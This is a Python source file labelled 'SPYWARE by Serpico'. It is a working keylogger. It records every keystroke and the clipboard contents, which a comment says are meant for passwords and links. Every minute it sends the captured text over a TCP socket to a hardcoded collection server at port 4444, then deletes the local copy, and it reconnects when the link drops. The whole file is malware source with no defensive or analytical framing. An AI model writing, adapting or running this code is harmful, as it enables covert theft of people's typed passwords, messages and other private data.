#!/usr/bin/env python3
#  _____  _____  __     ____          __           _____   ______
# / ____||  __ \ \ \   / /\ \        / /    /\    |  __ \ |  ____|
#| (___  | |__) | \ \_/ /  \ \  /\  / /    /  \   | |__) || |__
# \___ \ |  ___/   \   /    \ \/  \/ /    / /\ \  |  _  / |  __|
# ____) || |        | |      \  /\  /    / ____ \ | | \ \ | |____
#|_____/ |_|        |_|       \/  \/    /_/    \_\|_|  \_\|______|
#by Serpico

#---------------------------- IMPORT ----------------------------

import socket,time,sys
from pynput.keyboard import Listener,Key
import clipboard

#---------------------------- VARIABLES -------------------------

ip_server= '192.168.0.34'
port= 4444
file_save="save.txt"
time_interval=60 #file will be sent every 60 secondes
data_cp=''


#---------------------------- FUNCTIONS -------------------------

def capture(key): #records text typed on the keyboard and saves it into a file
    try:
        with open(file_save,'a') as f: #CHAR
            f.write(key.char)
    except:
        if key== Key.space: #SPACE
            with open(file_save,'a') as f: #CHAR
                f.write(' ')
        elif key== Key.tab: #TAB
            with open(file_save,'a') as f: #TAB
                f.write('\t')
        elif key== Key.backspace: #BACKSPACE
            with open(file_save,'a') as f: #BACKSPACE
                f.write(' <backspace> ')
        elif key== Key.enter: #ENTER
            with open(file_save,'a') as f: #ENTER
                f.write('\n')

def send(client_socket): #sends file to the server
    compt=0
    try:
        with open(file_save, 'r') as file:
            file_data = file.read()
        
        if file_data:
            client_socket.sendall(file_data.encode())
            print("--> sending <--")
            with open(file_save,'w') as file:
                file.write('')
            print("--> cleaning <--\n")            

        else:
            print("--> empty file <--\n")
    except:
        print("Error: cannot send file to the server...")
        compt+=1
        if(compt>4): #if the connexion between the server and the client is down for more than 10 minutes, it kills the program
            sys.exit(1)
        else:
            time.sleep(120)

def connect(): #connection to the server
    compt=0 
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            client_socket.connect((ip_server, port))
            print("Client is connected to the server")
            return client_socket
        except:
            print("Error: cannot connect to the server...")
            compt+=1
            if(compt>4): #if the connexion between the server and the client is down for more than 10 minutes, it kills the program
                sys.exit(1)
            else:
                time.sleep(120)

#---------------------------- NEW FEATURE -----------------------
                
def clipboard_save(): #save the clipboard (passwords, links....)
    global data_cp
    data = clipboard.paste()
    if (data!='' and data!=data_cp):
        with open(file_save, 'a') as file:
            file.write("\n---\nClipboard: "+data+" \n---\n")
        data_cp= data

#---------------------------- MAIN ------------------------------

def main(): #all the functions together :)
    
    while True:
        client_socket=connect()
        with Listener(on_press=capture) as ecoute:
            while True:
                try:
                    time.sleep(time_interval)
                    clipboard_save()
                    send(client_socket)
                except KeyboardInterrupt:
                    print(">>>stop<<<")
                    break
                except:
                    print("Error: the client can't send to the server")
                    client_socket.close()
                    break

if __name__ == "__main__":
    main()
